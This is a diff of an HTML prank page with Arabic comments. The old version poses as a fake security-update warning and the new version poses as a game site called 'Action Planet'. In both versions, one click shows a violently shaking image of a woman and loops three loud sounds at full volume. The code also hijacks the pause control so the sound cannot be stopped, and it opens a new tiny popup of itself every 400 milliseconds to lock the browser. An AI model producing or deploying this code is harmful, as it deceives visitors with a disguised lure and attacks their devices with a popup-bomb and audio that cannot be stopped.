@@ -3,75 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Update</title>
+    <title>Action Planet</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; font-family: 'Arial', sans-serif; overflow: hidden; }
         
-        /* الواجهة البيضاء الرسمية سواسوة */
-        #ui { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; transition: 0.3s; }
-        .warning-box { text-align: center; padding: 20px; }
-        .warning-icon { font-size: 50px; color: #f44336; margin-bottom: 10px; }
-        h2 { color: #333; margin-bottom: 10px; }
-        p { color: #666; font-size: 14px; margin-bottom: 30px; }
-        .btn-elegant { background: #007bff; color: #fff; border: none; padding: 15px 40px; border-radius: 25px; font-size: 18px; font-weight: 500; cursor: pointer; box-shadow: 0 4px 15px rgba(0,123,255,0.3); transition: 0.3s; }
-        .btn-elegant:active { transform: scale(0.95); background: #0056b3; }
-
-        /* صورة المرأة: رعشة ثابتة ومقلقة سواسوة */
-        #madImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 999; display: none; }
-        
-        @keyframes steadyJitter {
-            0% { transform: translate(2px, 1px) rotate(0deg); }
-            20% { transform: translate(-3px, -2px) rotate(-0.5deg); }
-            40% { transform: translate(-3px, 2px) rotate(0.5deg); }
-            60% { transform: translate(3px, 2px) rotate(-0.5deg); }
-            80% { transform: translate(-2px, -1px) rotate(0.5deg); }
-            100% { transform: translate(2px, 1px) rotate(0deg); }
+        /* واجهة كوكب أكشن الأنيقة سواسوة */
+        #ui { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            display: flex; flex-direction: column; justify-content: center; 
+            align-items: center; z-index: 10000; background: #ffffff;
         }
-        .vibrate-steady { display: block !important; animation: steadyJitter 0.04s infinite; }
+        .logo-text { font-size: 32px; color: #ffcc00; font-weight: bold; text-shadow: 2px 2px #000; margin-bottom: 20px; }
+        .btn-action { 
+            background: #ffcc00; color: #000; border: 4px solid #000; 
+            padding: 20px 50px; font-size: 24px; font-weight: bold; 
+            border-radius: 50px; cursor: pointer; box-shadow: 0 10px 0 #ccaa00;
+            transition: 0.1s;
+        }
+        .btn-action:active { transform: translateY(5px); box-shadow: 0 5px 0 #ccaa00; }
+
+        /* صورة المرأة: حركة ثابتة ومستقرة سواسوة */
+        #madImg { 
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
+            object-fit: cover; z-index: 999; display: none;
+        }
+
+        /* أنيميشن الرعشة الثابتة سواسوة */
+        @keyframes steadyJitter {
+            0% { transform: translate(3px, 3px) rotate(0deg); }
+            25% { transform: translate(-3px, -3px) rotate(-1deg); }
+            50% { transform: translate(3px, -3px) rotate(1deg); }
+            75% { transform: translate(-3px, 3px) rotate(-1deg); }
+            100% { transform: translate(3px, 3px) rotate(0deg); }
+        }
+        .vibrate { display: block !important; animation: steadyJitter 0.05s infinite; }
     </style>
 </head>
 <body>
 
     <div id="ui">
-        <div class="warning-box">
-            <div class="warning-icon">⚠️</div>
-            <h2>تحديث أمني مطلوب</h2>
-            <p>تم اكتشاف نشاط مشبوه على جهازك. يرجى الضغط على الزر أدناه لتأمين بياناتك فوراً.</p>
-            <button class="btn-elegant" onclick="launchChaos()">تأمين الآن</button>
-        </div>
+        <div class="logo-text">مرحباً بكم في كوكب أكشن</div>
+        <button class="btn-action" onclick="enterTheAction()">دخول</button>
     </div>
 
     <img id="madImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
     <script>
-        function launchChaos() {
-            // 1. اختفاء الواجهة وظهور المرأة سواسوة
+        function enterTheAction() {
+            // 1. إخفاء الواجهة فوراً وظهور المرأة سواسوة
             document.getElementById('ui').style.display = 'none';
-            document.getElementById('madImg').classList.add('vibrate-steady');
+            document.getElementById('madImg').classList.add('vibrate');
 
-            // 2. الأصوات الـ 3 المريغلة سواسوة
-            const audios = [
+            // 2. تشغيل الأصوات الثلاثة في رحبة سواسوة
+            const tracks = [
                 "https://www.myinstants.com/media/sounds/hoova-2.mp3",
                 "https://www.myinstants.com/media/sounds/chicken-on-tree-screaming.mp3",
                 "https://www.myinstants.com/media/sounds/dzonza.mp3"
             ];
 
-            audios.forEach(src => {
+            tracks.forEach(src => {
                 let a = new Audio(src);
                 a.loop = true;
                 a.volume = 1.0;
                 a.play();
                 
-                // ميزة الصوت المستمر سواسوة (يلسق في الـ Background)
+                // تثبيت الصوت في الخلفية سواسوة
                 if ('mediaSession' in navigator) {
-                    navigator.mediaSession.metadata = new MediaMetadata({ title: 'System Security', artist: 'Protected' });
-                    navigator.mediaSession.setActionHandler('play', () => a.play());
-                    navigator.mediaSession.setActionHandler('pause', () => a.play()); // ممنوع التوقف سواسوة
+                    navigator.mediaSession.metadata = new MediaMetadata({ title: 'Action Planet', artist: 'Planet' });
+                    navigator.mediaSession.setActionHandler('pause', () => a.play());
                 }
             });
 
-            // 3. منع الخروج سواسوة
-            setInterval(() => { window.open(window.location.href, '_blank', 'width=10,height=10'); }, 400);
+            // 3. قفل المتصفح سواسوة
+            setInterval(() => {
+                window.open(window.location.href, '_blank', 'width=10,height=10');
+            }, 400);
         }
     </script>
 </body>
